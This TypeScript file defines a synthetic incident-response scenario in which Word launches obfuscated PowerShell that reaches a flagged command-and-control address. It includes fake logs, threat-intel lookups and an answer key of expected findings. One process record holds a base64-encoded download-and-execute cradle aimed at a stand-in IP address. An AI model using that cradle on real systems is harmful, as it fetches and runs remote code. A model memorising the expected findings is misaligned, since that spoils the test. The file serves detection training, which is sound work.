/**
 * Scenario 01 — Suspicious PowerShell.
 *
 * An employee workstation runs an obfuscated PowerShell command that
 * downloads a second stage from a known C2 staging domain, then decodes
 * and executes it in memory. The investigator should recognise the lolbin
 * pattern (powershell.exe + encoded command + network egress).
 */

import type {
  DnsRecord,
  EventRecord,
  IdentityActivityRecord,
  IndicatorLookupResult,
  NetworkConnectionRecord,
  ProcessRecord,
  FileAnalysisReport,
} from '../../integration-types';
import type { SyntheticDataset, SyntheticScenario } from '../scenario-types';
import { SCENARIO_EPOCH_MS, SCENARIO_HOSTS, SCENARIO_USERS, makeIdFactory, ts } from '../scenario-helpers';

export const suspiciousPowershellScenario: SyntheticScenario = {
  id: 'suspicious-powershell',
  displayName: 'Suspicious PowerShell (lolbin + C2)',
  shortDescription: 'Encoded PowerShell downloads a second stage from a C2 staging domain.',
  domain: 'endpoint / network',
  difficulty: 'intro',
  build(): SyntheticDataset {
    const id = makeIdFactory('pwsh');
    const events: EventRecord[] = [
      {
        id: id(),
        timestamp: SCENARIO_EPOCH_MS,
        source: 'synthetic-siem',
        severity: 'informational',
        message: 'User a.harper signed in to CYBER-WIN-WS01 from 10.10.20.31 (interactive logon).',
        raw: { synthetic: true, eventCode: 4624, logonType: 2 },
      },
      {
        id: id(),
        timestamp: ts(45),
        source: 'synthetic-siem',
        severity: 'medium',
        message: 'WinWord.exe spawned powershell.exe (parent-child unusual). Command line contains -EncodedCommand.',
        raw: { synthetic: true, eventCode: 1, parent: 'winword.exe' },
      },
      {
        id: id(),
        timestamp: ts(46),
        source: 'synthetic-siem',
        severity: 'high',
        message: 'PowerShell -EncodedCommand executed; AMSI flagged ScriptBlock 1 of 1 as suspicious.',
        raw: { synthetic: true, amsi: true, engine: 'AMSI' },
      },
      {
        id: id(),
        timestamp: ts(48),
        source: 'synthetic-siem',
        severity: 'high',
        message: 'Sysmon event: outbound connection to 198.51.100.45:443 from powershell.exe (PID 7724).',
        raw: { synthetic: true, eventCode: 3, image: 'powershell.exe' },
      },
    ];
    const processes: ProcessRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS01.hostname,
        pid: 4102,
        name: 'winword.exe',
        commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\a.harper\\Documents\\Q3-forecast-rev2.docm"',
        parentName: 'explorer.exe',
        parentPid: 2304,
        startTime: ts(40),
      },
      {
        id: id(),
        host: SCENARIO_HOSTS.WS01.hostname,
        pid: 7724,
        name: 'powershell.exe',
        commandLine:
          'powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADAALgAxADAAMAAuADQANQAvAGEAcwBuAC8AYgAvAGMAbABpAC4AcABuAGcAJwApAC4AUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA7AA==',
        parentName: 'winword.exe',
        parentPid: 4102,
        user: SCENARIO_USERS.alice.username,
        startTime: ts(45),
      },
    ];
    const networkConnections: NetworkConnectionRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS01.hostname,
        processName: 'powershell.exe',
        pid: 7724,
        localAddress: SCENARIO_HOSTS.WS01.ip,
        remoteAddress: '198.51.100.45',
        remotePort: 443,
        protocol: 'tcp',
        timestamp: ts(46),
      },
    ];
    const dnsQueries: DnsRecord[] = [
      {
        id: id(),
        host: SCENARIO_HOSTS.WS01.hostname,
        timestamp: ts(45),
        query: 'cdn-stats.example.org',
        queryType: 'A',
        response: '198.51.100.45',
      },
    ];
    const identityActivity: IdentityActivityRecord[] = [
      {
        id: id(),
        actor: SCENARIO_USERS.alice.username,
        action: 'interactive-logon',
        target: SCENARIO_HOSTS.WS01.hostname,
        timestamp: SCENARIO_EPOCH_MS,
        source: 'synthetic-identity',
        ipAddress: '10.10.20.31',
        result: 'success',
      },
    ];
    const fileAnalysisReports: FileAnalysisReport[] = [
      {
        submissionId: 'fa-pwsh-001',
        status: 'complete',
        verdict: 'malicious',
        score: 92,
        engines: [
          { name: 'SentinelOne Static', verdict: 'malicious' },
          { name: 'CrowdStrike Sandboxing', verdict: 'malicious' },
        ],
        completedAt: ts(60),
      },
    ];
    const indicatorLookups: IndicatorLookupResult[] = [
      {
        indicator: '198.51.100.45',
        indicatorType: 'ip',
        verdict: 'malicious',
        confidence: 88,
        categories: ['c2', 'phishing-staging'],
        sources: ['synthetic-feed'],
      },
      {
        indicator: 'cdn-stats.example.org',
        indicatorType: 'domain',
        verdict: 'malicious',
        confidence: 84,
        categories: ['c2'],
        sources: ['synthetic-feed'],
      },
    ];
    return {
      scenarioId: 'suspicious-powershell',
      objective: {
        title: '[SYNTHETIC DEMO] Suspicious PowerShell on CYBER-WIN-WS01',
        summary: 'Encoded PowerShell launched by Word spawns a download cradle to 198.51.100.45.',
        initialPrompt:
          'Investigate the EDR/SIEM alert that flagged a suspicious PowerShell command on CYBER-WIN-WS01. Determine the scope, the user, and what was downloaded.',
      },
      suspicion: {
        expectedFindings: [
          'winword.exe spawned powershell.exe with an -EncodedCommand',
          'AMSI flagged the decoded ScriptBlock',
          'Outbound TLS connection to 198.51.100.45 from powershell.exe',
          'DNS resolution of cdn-stats.example.org right before egress',
        ],
        expectedHypotheses: [
          'A weaponised Office macro dropped an encoded PowerShell cradle (T1059.001 + T1204.002).',
          'The host is beaconing to infrastructure flagged by threat intel as C2.',
        ],
        decoys: [
          'Background telemetry from office update service appears normal.',
        ],
      },
      hosts: [
        SCENARIO_HOSTS.WS01,
        SCENARIO_HOSTS.DC01,
      ],
      users: [SCENARIO_USERS.alice],
      events,
      processes,
      networkConnections,
      dnsQueries,
      identityActivity,
      fileAnalysisReports,
      indicatorLookups,
    };
  },
};